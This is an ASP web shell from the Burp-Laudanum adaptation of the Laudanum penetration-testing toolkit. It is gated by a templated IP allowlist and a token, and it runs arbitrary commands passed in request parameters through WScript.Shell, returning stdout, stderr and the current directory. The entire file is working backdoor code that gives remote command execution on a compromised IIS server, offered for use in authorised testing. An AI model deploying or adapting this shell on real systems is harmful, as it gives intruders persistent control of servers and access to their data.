<%
' *******************************************************************************
' ***
' *** Burp-Laudanum
' ***
' *** This is a Burp CO2 adoptation of similar functionality defined in the
' *** Laudanum project.
' ***
' *** CO2: www.burpco2.com
' ***
' *** Burp-Laudanum Author:
' ***         Jason Gillam <jgillam@secureideas.com>
' ***
' *** Laudanum Project
' *** A Collection of Injectable Files used during a Penetration Test
' ***
' *** More information is available at:
' ***  http://laudanum.secureideas.net
' ***  laudanum@secureideas.net
' ***
' ***  Project Leads:
' ***         Kevin Johnson <kjohnson@secureideas.net
' ***         Tim Medin <tim@counterhack.com>
' ***
' *** Copyright 2013 by Kevin Johnson and the Laudanum Team
' ***
' ********************************************************************************
' ***
' ***   Updated and fixed by Robin Wood <Digininja>
' ***   Updated and fixed by Tim Medin <tim@counterhack.com
' ***
' ********************************************************************************
' *** This program is free software; you can redistribute it and/or
' *** modify it under the terms of the GNU General Public License
' *** as published by the Free Software Foundation; either version 2
' *** of the License, or (at your option) any later version.
' ***
' *** This program is distributed in the hope that it will be useful,
' *** but WITHOUT ANY WARRANTY; without even the implied warranty of
' *** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
' *** GNU General Public License for more details.
' ***
' *** You can get a copy of the GNU General Public License from this
' *** address: http://www.gnu.org/copyleft/gpl.html#SEC1
' *** You can also write to the Free Software Foundation, Inc., Temple
' *** Place - Suite  Boston, MA   USA.
' ***
' ***************************************************************************** */


' can set this to 0 for never time out but don't want to kill the server if a script
' goes into a loop for any reason
Server.ScriptTimeout = 180

ip=request.ServerVariables("REMOTE_ADDR")

If (InStr(1, "${LAUD.IPS}", ip, vbTextCompare) = 0) Then
	response.Status="404 Page Not Found"
	response.Write(response.Status)
	response.End
End If

token = Request.QueryString("laudtoken")
If (token = "") Then
	token = Request.Form("laudtoken")
End If
If (token <> "${LAUD.TOKEN}") Then
	response.Status="403 Access Denied"
	response.Write(response.Status)
	response.End
End If

On Error Resume Next
Err.Clear

cmd = Request.QueryString("laudcmd")
If (cmd = "") Then
	cmd = Request.Form("laudcmd")
End If

cwd = Request.QueryString("laudcwd")
If (cwd = "") Then
	cwd = Request.Form("laudcwd")
End If

If (cwd = "." Or cwd = "") Then
	set fso = CreateObject("Scripting.FileSystemObject")
	cwd = fso.GetFolder(".")
	set fso = nothing
End If

Dim wshell, intReturn, strPResult, strEResult
set wshell = Server.CreateObject("WScript.Shell")
wshell.CurrentDirectory = cwd

If (Left(cmd, 2) = "cd") Then
	newname = Right(cmd, len(cmd) - 3)
	set fso = CreateObject("Scripting.FileSystemObject")
	newdir = fso.BuildPath(cwd, newname)
	If (fso.FolderExists(newdir)) Then
		wshell.CurrentDirectory = newdir
		strPResult = "(Laudanum: cd succeeded)"
	Else
		strEResult = "Error: Folder does not exist."
	End If
Else
	Set objCmd = wShell.Exec(cmd)
	strPResult = objCmd.StdOut.Readall()
	strEResult = objCmd.StdErr.Readall()
End If

If Err.Number = 0 Then
	response.write "stdout=" & Server.URLEncode(strPResult) & "&stderr=" & Server.URLEncode(strEResult) & "&cwd=" & Server.URLEncode(wshell.CurrentDirectory)
Else
	response.write "stderr=" & Err.Source & " - " & Err.Description & "&cwd=" & cwd
End If

set wshell = nothing

%>
